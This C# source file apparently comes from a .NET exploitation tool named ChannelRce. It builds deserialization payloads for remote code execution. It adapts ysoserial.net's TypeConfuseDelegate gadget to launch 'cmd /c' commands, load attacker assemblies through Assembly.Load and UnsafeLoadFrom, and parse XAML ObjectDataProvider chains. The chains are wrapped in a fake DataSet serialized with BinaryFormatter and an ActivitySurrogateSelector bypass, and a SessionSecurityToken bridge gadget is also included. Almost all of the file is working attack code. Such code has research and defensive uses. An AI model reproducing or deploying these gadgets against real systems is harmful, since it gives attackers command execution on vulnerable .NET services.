using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IdentityModel.Tokens;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Claims;
using System.Text;
using System.Windows;
using System.Windows.Data;
using System.Windows.Markup;
using System.Xml;
namespace ChannelRce
{


    public class MyEqualityComparer : IEqualityComparer
    {
        private int objcount = 0;
        public MyEqualityComparer(int countfrom)
        {
            objcount = countfrom;
        }

        public bool Equals(object x, object y)
        {
            Console.WriteLine("Equals" + x.ToString() + "-" + y.ToString());
            return true;
        }


        public int GetHashCode(object obj)
        {
            int ret = 0;
            if (obj != null)
            {
                string objstr = obj.ToString();

                if (objstr.StartsWith("odp"))
                {
                    string strint = objstr.Substring(3);

                    ret = objcount + 1 - int.Parse(strint);
                }
                Console.WriteLine("GetHashCode" + objstr);

            }

            return ret;
        }
    }

    [Serializable]
    public class FakeDataSet : ISerializable
    {
        private int asmindex = 0;
        private int asmend = 0;
        private bool isnew = false;
        public FakeDataSet(int asm_index, int asm_end, bool newmode)
        {
            asmindex = asm_index;
            asmend = asm_end;
            isnew = newmode;
        }

        //https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs
        // thanks guys!
        public static SortedSet<string> TypeConfuseDelegateGadget(string cmd)
        {

            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            FieldInfo fi =
                typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }


        public static SortedSet<Array> TypeConfuseDelegateGadgetAsm()
        {
            string dllpath = typeof(FakeAsm.ClassFake).Assembly.Location;
            string pdbpath = dllpath.Replace(".dll", ".pdb");
            Array dllbytes = File.ReadAllBytes(dllpath).ToArray();
            Array pdbbytes = File.ReadAllBytes(pdbpath).ToArray();
            Console.WriteLine("Load dllpath:=>" + dllpath);
            Console.WriteLine("Load pdbpath:=>" + pdbpath);
            Console.WriteLine("Load dllbytes:=>" + dllbytes.Length + ",pdbbytes:=>" + pdbbytes.Length);
            Delegate da = new Comparison<Array>(Array.LastIndexOf);
            Comparison<Array> d = (Comparison<Array>)MulticastDelegate.Combine(da, da);
            IComparer<Array> comp = Comparer<Array>.Create(d);
            SortedSet<Array> set = new SortedSet<Array>(comp);

            set.Add(dllbytes);
            set.Add(pdbbytes);

            FieldInfo fi =
                typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            // invoke_list[0] = new Func<byte[], byte[], Assembly>(Assembly.Load);
            invoke_list[1] = new Func<byte[], byte[], Assembly>(Assembly.Load);
            fi.SetValue(d, invoke_list);

            return set;
        }



        public static SortedSet<string> TypeConfuseDelegateGadgetXaml(string xamlpayload)
        {

            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(xamlpayload);
            set.Add("");

            FieldInfo fi =
                typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, object>(XamlReader.Parse);
            fi.SetValue(d, invoke_list);

            return set;
        }
        //exploit Assembly.UnsafeLoadFrom by locol cppdotnetrce.dll
        public static SortedSet<string> TypeConfuseDelegateGadgetdllpath()
        {
            string dllpath = @"pathto\cppdotnetrce.dll";
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(dllpath);
            set.Add("");

            FieldInfo fi =
                typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, Assembly>(Assembly.UnsafeLoadFrom);
            fi.SetValue(d, invoke_list);

            return set;
        }
        public static void FixObjectDataProvider(object obj)
        {
            foreach (PropertyDescriptor property in TypeDescriptor.GetProperties(obj))
            {
                if (property.Name == "MethodParameters")
                {
                    Console.WriteLine(property.Name);

                    PropertyInfo attprop = typeof(MemberDescriptor).GetProperty("AttributeArray",
                        BindingFlags.Instance | BindingFlags.NonPublic);
                    Attribute[] AttributeArray = attprop.GetValue(property) as Attribute[];

                    List<Attribute> AttributeArraynew = new List<Attribute>();
                    AttributeArraynew.AddRange(AttributeArray);

                    bool fid = false;
                    for (int i = 0; i < AttributeArraynew.Count; i++)
                    {
                        if (AttributeArraynew[i] is DesignerSerializationVisibilityAttribute)
                        {
                            AttributeArraynew[i] =
                                DesignerSerializationVisibilityAttribute.Content;
                            fid = true;
                        }

                    }

                    if (!fid)
                    {
                        AttributeArraynew.Add(DesignerSerializationVisibilityAttribute.Content);
                    }

                    attprop.SetValue(property, AttributeArraynew.ToArray());
                }
            }

        }

        public static string Xaml_serialize(object myobj)
        {

            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;

            StringBuilder sb = new StringBuilder();

            using (XmlWriter writer = XmlWriter.Create(sb, settings))
            {
                System.Windows.Markup.XamlWriter.Save(myobj, writer);
            }

            string text = sb.ToString();
            return text;
        }



        public string xamlrcepayloadnew(int asm_index, int trycount)
        {


            ResourceDictionary myResourceDictionary = new ResourceDictionary();
            Dictionary<string, ObjectDataProvider> myResourceDictionaryaux = new Dictionary<string, ObjectDataProvider>();

            string odp1name = "odp1";
            string odp2name = "odp2";
            string odp3name = "odp3";
            string odp4name = "odp4";
            string odp5name = "odp5";
            string odp6name = "odp6";
            string odp7name = "odp7";
            string odp8name = "odp8";

            var odp1 = new ObjectDataProvider();
            odp1.ObjectType = typeof(System.Threading.Thread);

            odp1.MethodName = "GetDomain";


            StaticResourceExtension odpext1 = new StaticResourceExtension(odp1name);


            ObjectDataProvider odp2 = new ObjectDataProvider();
            odp2.MethodName = "GetAssemblies";

            odp2.ObjectInstance = odpext1;
            StaticResourceExtension odpext2 = new StaticResourceExtension(odp2name);
            int staridx = 3;
            int asmoffset = 0;
            for (int i = 0; i < trycount; i += 2)
            {
                int asm_indexnow = asm_index + asmoffset;
                asmoffset++;
                string odpnameaux = "odp" + (staridx + i);

                ObjectDataProvider odp3 = new ObjectDataProvider();
                odp3.MethodName = "GetValue";



                odp3.ObjectInstance = odpext2;

                Console.WriteLine(asm_indexnow);
                odp3.MethodParameters.Add(asm_indexnow);

                StaticResourceExtension odpext3 = new StaticResourceExtension(odpnameaux);
                ObjectDataProvider odp4 = new ObjectDataProvider();

                odp4.ObjectInstance = odpext3;


                odp4.MethodName = "GetCustomAttributes";


                odp4.MethodParameters.Add(false);


                string odpnameaux2 = "odp" + (staridx + i + 1);
                myResourceDictionaryaux.Add(odpnameaux, odp3);
                myResourceDictionaryaux.Add(odpnameaux2, odp4);
            }





            FieldInfo fi_baseDictionary = myResourceDictionary.GetType().GetField("_baseDictionary", BindingFlags.NonPublic | BindingFlags.Instance);

            FieldInfo fi_keycomparer = typeof(Hashtable).GetField("_keycomparer", BindingFlags.NonPublic | BindingFlags.Instance);
            Hashtable hstbl = (Hashtable)fi_baseDictionary.GetValue(myResourceDictionary);



            MyEqualityComparer mycmp = new MyEqualityComparer(3 + trycount);

            fi_keycomparer.SetValue(hstbl, mycmp);




            myResourceDictionary.Add(odp1name, odp1);

            myResourceDictionary.Add(odp2name, odp2);

            foreach (KeyValuePair<string, ObjectDataProvider> keyValuePair in myResourceDictionaryaux)
            {
                myResourceDictionary.Add(keyValuePair.Key, keyValuePair.Value);
            }


            foreach (DictionaryEntry o in myResourceDictionary)
            {
                FixObjectDataProvider(o.Value);


            }


            Console.WriteLine("Xaml_serialize");
            string payload = Xaml_serialize(myResourceDictionary);
            Console.WriteLine("Xaml_serialize payload");
            return payload;
        }


        public string xamlrcepayload(int asm_index)
        {

            var myResourceDictionary = new ResourceDictionary();
            Type Activatortp = typeof(System.Activator);
            string odp1name = "odp1";
            string odp2name = "odp2";
            string odp3name = "odp3";
            string odp4name = "odp4";
            string odp5name = "odp5";
            string odp6name = "odp6";
            string odp7name = "odp7";
            string odp8name = "odp8";

            var odp1 = new ObjectDataProvider();
            odp1.ObjectType = typeof(System.Threading.Thread);

            odp1.MethodName = "GetDomain";


            StaticResourceExtension odpext1 = new StaticResourceExtension(odp1name);


            ObjectDataProvider odp2 = new ObjectDataProvider();
            odp2.MethodName = "GetAssemblies";

            odp2.ObjectInstance = odpext1;



            ObjectDataProvider odp3 = new ObjectDataProvider();
            odp3.MethodName = "GetValue";


            StaticResourceExtension odpext2 = new StaticResourceExtension(odp2name);
            odp3.ObjectInstance = odpext2;


            odp3.MethodParameters.Add(asm_index);



            ObjectDataProvider odp4 = new ObjectDataProvider();
            odp4.MethodName = "GetTypes";


            StaticResourceExtension odpext3 = new StaticResourceExtension(odp3name);

            odp4.ObjectInstance = odpext3;


            ObjectDataProvider odp5 = new ObjectDataProvider();
            odp5.MethodName = "GetValue";


            StaticResourceExtension odpext4 = new StaticResourceExtension(odp4name);
            odp5.ObjectInstance = odpext4;


            odp5.MethodParameters.Add(0);

            ObjectDataProvider odp6 = new ObjectDataProvider();
            // odp6.MethodName = "InvokeMember";
            odp6.MethodName = "GetProperty";


            odp6.MethodParameters.Add("fakeobbj");
            odp6.MethodParameters.Add(BindingFlags.Public | BindingFlags.Static);

            StaticResourceExtension odpext5 = new StaticResourceExtension(odp5name);
            odp6.ObjectInstance = odpext5;

            ObjectDataProvider odp7 = new ObjectDataProvider();
            odp7.MethodName = "GetCustomAttributes";


            StaticResourceExtension odpext6 = new StaticResourceExtension(odp6name);
            odp7.ObjectInstance = odpext6;


            odp7.MethodParameters.Add(false);



            FieldInfo fi_baseDictionary = myResourceDictionary.GetType().GetField("_baseDictionary", BindingFlags.NonPublic | BindingFlags.Instance);

            FieldInfo fi_keycomparer = typeof(Hashtable).GetField("_keycomparer", BindingFlags.NonPublic | BindingFlags.Instance);
            Hashtable hstbl = (Hashtable)fi_baseDictionary.GetValue(myResourceDictionary);



            MyEqualityComparer mycmp = new MyEqualityComparer(8);

            fi_keycomparer.SetValue(hstbl, mycmp);



            myResourceDictionary.Add(odp1name, odp1);

            myResourceDictionary.Add(odp2name, odp2);


            myResourceDictionary.Add(odp3name, odp3);

            myResourceDictionary.Add(odp4name, odp4);
            myResourceDictionary.Add(odp5name, odp5);
            myResourceDictionary.Add(odp6name, odp6);
            myResourceDictionary.Add(odp7name, odp7);
            // myResourceDictionary.Add(odp8name, odp8);



            foreach (DictionaryEntry o in myResourceDictionary)
            {
                FixObjectDataProvider(o.Value);


            }


            Console.WriteLine("Xaml_serialize");
            string payload = Xaml_serialize(myResourceDictionary);
            Console.WriteLine("Xaml_serialize payload");
            return payload;
        }


        public static SessionSecurityToken SessionSecurityTokenGadget(object gadget)
        {

            // - Create new ClaimsIdentity and set the BootstrapConext
            // - Bootrstrap context is set to to the TypeConfuseDelegateGadget from 
            //      ysoserial and is of Type SortedSet<string>
            // - The TypeConfuseDelegateGadget will execute notepad
            ClaimsIdentity id = new ClaimsIdentity();
            id.BootstrapContext = gadget;

            // - Create new ClaimsPrincipal and add the ClaimsIdentity to it
            ClaimsPrincipal principal = new ClaimsPrincipal();
            principal.AddIdentity(id);

            // - Finally create the SessionSecurityToken which takes the principal
            //      in its constructor
            SessionSecurityToken s = new SessionSecurityToken(principal);


            // - The SessionSecurityToken is serializable using DataContractSerializer
            // - When it gets deserialized the BootstrapContext will get deserialized 
            //      using BinaryFormatter, which is more powerful from an attackers
            //      perspective, and will not be subject to any kind of whitelisting.
            //      In this sense it a "bridge" from DataContractSerializer to
            //      BinaryFormatter
            // - This will cause an exception to be thrown when the BootstrapContext
            //      is deserialized, but we still get the command execution:
            //          Unhandled Exception: System.InvalidCastException: Unable to cast 
            //          object of type 'System.Collections.Generic.SortedSet`1[System.String]' 
            //          to type 'System.IdentityModel.Tokens.BootstrapContext'
            return s;
        }


        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {

            info.SetType(typeof(System.Data.DataSet));
            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
            info.AddValue("DataSet.DataSetName", "");
            info.AddValue("DataSet.Namespace", "");
            info.AddValue("DataSet.Prefix", "");
            info.AddValue("DataSet.CaseSensitive", false);
            info.AddValue("DataSet.LocaleLCID", 0x409);
            info.AddValue("DataSet.EnforceConstraints", false);
            info.AddValue("DataSet.ExtendedProperties", (PropertyCollection)null);
            info.AddValue("DataSet.Tables.Count", 1);
            object gadget = null;
            if (asmindex == 0)
            {
                gadget = TypeConfuseDelegateGadgetAsm();
            }
            else
            {

                if (isnew)
                {
                    int trycount = asmend - asmindex;

                    trycount = (trycount >> 1 )<< 1;
                  // trycount = 0x20;
                    Console.WriteLine("Exploit New Mode From "+ asmindex+" to "+(asmindex+ trycount));
                    string payload = xamlrcepayloadnew(asmindex, trycount);
                    gadget = TypeConfuseDelegateGadgetXaml(payload);
                    /*object gadgetobj = TypeConfuseDelegateGadgetXaml(payload);
                    gadget = SessionSecurityTokenGadget(gadgetobj);*/
                }
                else
                {
                    Console.WriteLine("Exploit Old Mode At " + asmindex);
                    string payload = xamlrcepayload(asmindex);

                    gadget = TypeConfuseDelegateGadgetXaml(payload);

                    /*object gadgetobj = TypeConfuseDelegateGadgetXaml(payload);
                    gadget = SessionSecurityTokenGadget(gadgetobj);*/
                }

                // gadget = TypeConfuseDelegateGadgetXaml(payload);

            }

            // object gadget = TypeConfuseDelegateGadgetdllpath();


            // create a big buffer since we don't know what the object size will be
            MemoryStream stm = new MemoryStream();



            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt =
                new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            fmt.SurrogateSelector = new MySurrogateSelector();
            fmt.Serialize(stm, gadget);

            byte[] payloadInByte = stm.ToArray();
            info.AddValue("DataSet.Tables_0", payloadInByte);
        }
    }

    public class MySurrogateSelector : SurrogateSelector
    {
        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context,
            out ISurrogateSelector selector)
        {
            selector = this;
            if (!type.IsSerializable)
            {
                Type t = Type.GetType(
                    "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                return (ISerializationSurrogate)Activator.CreateInstance(t);
            }

            return base.GetSurrogate(type, context, out selector);
        }

    }
}